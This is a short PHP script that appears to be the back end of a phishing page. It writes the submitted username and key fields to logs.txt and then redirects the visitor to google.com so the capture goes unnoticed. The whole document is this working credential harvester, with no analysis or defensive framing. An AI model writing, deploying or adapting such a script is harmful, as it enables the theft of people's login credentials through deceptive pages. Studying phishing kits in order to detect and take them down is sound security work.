<?PHP 
$info = "$_POST[username],$_POST[key]\n";
file_put_contents("logs.txt", $info, FILE_APPEND);

header("Location: http://www.google.com");
exit;
?>

